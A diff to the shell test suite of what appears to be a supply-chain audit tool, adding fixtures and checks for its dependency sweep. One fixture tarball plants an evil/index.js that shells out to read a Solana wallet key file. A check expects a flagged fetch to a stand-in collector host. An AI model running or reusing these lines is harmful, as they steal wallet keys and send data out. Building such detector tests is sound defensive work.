@@ -2273,7 +2273,7 @@ check "... the budget: direct, pin, then the young version; the old package meta
 check "... old and new fetched from the URLs the records give (the npm record from the age answer, not asked again), and compared" \
   sh -c "grep -qxF '>> artifacts: 3 entries, 5 artifacts fetched, 0 failed after one retry' '$T/out' && [ \$(grep -c '^url: https://registry.npmjs.org/lb-direct/1.1.0\$' '$T/calls') = 0 ] && [ -f '$LB/1/new/files/package/index.js' ] && [ -f '$LB/1/old/files/package/index.js' ] && [ -f '$LB/2/new/files/lb_crate-0.2.0/build.rs' ]"
 check "... the sweep, counts first: the new postinstall and build.rs (SC-059), the new fetch (SC-060)" \
-  sh -c "grep -qxF '>> sweep: SC-059 2 hits in 2 entries, SC-060 1 hits in 1 entries, binary files added or changed 0 in 0 entries; the hits are in the report' '$T/out' && grep -q '^1. npm lb-direct 1.0.0 -> 1.1.0 \[direct,young\] SC-059 1, SC-060 1, binary 0; files +0 ~2 -0\$' '$LB.txt' && grep -qF 'SC-060 index.js:2: fetch(\"https://collector.invalid/k\");' '$LB.txt' && grep -q '^SC-059 build.rs:0: a build.rs file added\$' '$LB.txt'"
+  sh -c "grep -qxF '>> sweep: SC-059 2 hits in 2 entries, SC-060 1 hits in 1 entries, binary files added or changed 0 in 0 entries; the hits are in the report' '$T/out' && grep -q '^1. npm lb-direct 1.0.0 -> 1.1.0 \[direct,young\] SC-059 1, SC-060 1, binary 0; files +0 ~2 -0\$' '$LB.txt' && grep -qF 'SC-060 package/index.js:2: fetch(\"https://collector.invalid/k\");' '$LB.txt' && grep -q '^SC-059 lb_crate-0.2.0/build.rs:0: a build.rs file added\$' '$LB.txt'"
 check "... one disclosure row per service for the whole run, each naming the set" \
   sh -c "[ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 3 ] && tail -n 3 '$DT' | cut -f3 | tr '\n' ' ' | grep -qxF 'npmjs.org crates.io pypi.org ' && [ \$(tail -n 3 '$DT' | grep -c 'audit_1/deps/lock-set-$LBN.tsv	1\$') = 3 ]"
 check "... the run directory still passes its check" sh -c "(cd '$WT' && '$ROOT/scripts/rundir.sh' check audit_1) >/dev/null"
@@ -2313,6 +2313,44 @@ check "lock-budget: a row whose name is outside npm's grammar is never sent" \
 run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=maybe -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
 check "lock-budget: an AUDITOR_PUBLISH_AGE other than on or off is refused before any request" \
   sh -c "[ '$RC' = 64 ] && grep -qxF \"deps: refused: AUDITOR_PUBLISH_AGE is 'maybe', not on or off\" '$T/err' && [ ! -s '$T/calls' ]"
+# an npm tarball with two first folders, whose second copy of index.js is the one npm keeps, and an entry
+# whose name is not UTF-8; a package the registry has no record of; a call out of time
+python3 -I - "$T/fix" <<'PY'
+import base64, hashlib, io, json, os, sys, tarfile, time
+fix = sys.argv[1]
+def put(url, data):
+    key = url.replace("/", "_").replace(":", "_").replace("%", "_").replace("@", "_")
+    open(os.path.join(fix, key), "wb").write(data if isinstance(data, bytes) else data.encode())
+buf = io.BytesIO()
+with tarfile.open(fileobj=buf, mode="w:gz", format=tarfile.PAX_FORMAT, encoding="utf-8", errors="surrogateescape") as t:
+    for name, data in (("package/package.json", b"{\"name\": \"lb-twotop\"}\n"), ("package/index.js", b"module.exports = 1;\n"),
+                       ("evil/index.js", b"require(\"child_process\").exec(\"cat ~/.config/solana/id.json\");\n"),
+                       ("package/odd-\udcff.js", b"x\n")):
+        ti = tarfile.TarInfo(name)
+        ti.size = len(data)
+        t.addfile(ti, io.BytesIO(data))
+data = buf.getvalue()
+url = "https://registry.npmjs.org/lb-twotop/-/lb-twotop-1.0.0.tgz"
+put(url, data)
+rec = {"name": "lb-twotop", "version": "1.0.0", "_npmUser": {"name": "eve"},
+       "dist": {"tarball": url, "integrity": "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()}}
+put("https://registry.npmjs.org/lb-twotop", json.dumps({"name": "lb-twotop", "time": {"1.0.0": "2020-01-01T00:00:00.000Z"}, "versions": {"1.0.0": rec}}))
+PY
+LBN=106
+lb_set "$LBN" 'npm	package-lock.json	lb-twotop	-	1.0.0	-	public	direct' 'npm	package-lock.json	lb-gone	-	3.0.0	-	public	-'
+run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/^>> lock-budget: .*lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/out")
+LBR=$WT/audit_1/deps/lock-budget-$n.txt
+check "lock-budget: two first folders in one tarball: the shared path and the folder flagged, every copy read whole" \
+  sh -c "[ '$RC' = 1 ] && grep -q '^SC-060 index.js:0: 2 entries of the artifact unpack to this path, and the package manager keeps one: evil/index.js, package/index.js\$' '$LBR' && grep -q '^SC-060 evil/index.js:0: an entry outside the package/ folder the registry puts every entry under\$' '$LBR' && grep -qF 'SC-060 evil/index.js:1: require(\"child_process\")' '$LBR'"
+check "... an entry whose name is not UTF-8 does not stop the report" sh -c "[ '$RC' = 1 ] && grep -q '^1. npm lb-twotop - -> 1.0.0 \[direct\] SC-059 0, SC-060 ' '$LBR'"
+check "lock-budget: a package the registry has no record of is flagged as not listed, not left unchecked" \
+  sh -c "grep -q '; not listed by the registry: 1\$' '$T/out' && grep -q '^  not listed by the registry: npm lb-gone 3.0.0 (package-lock.json)\$' '$LBR'"
+LBN=107
+lb_set "$LBN" 'npm	package-lock.json	lb-young	-	0.1.0	-	public	direct'
+run "$DEPS" "$WT" AUDITOR_RUN_TIMEOUT=3 -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+check "lock-budget out of time: no request, exit 3, the count and the reason given" \
+  sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: 1 of 1 selected artifacts could not be fetched after one retry, the call having reached its time limit; output ' '$T/err' && ! grep -q '^== curl' '$T/calls'"
 
 # =================================================================================================
 # sast.sh: semgrep with allowlisted rulesets, its SARIF in R/sast.
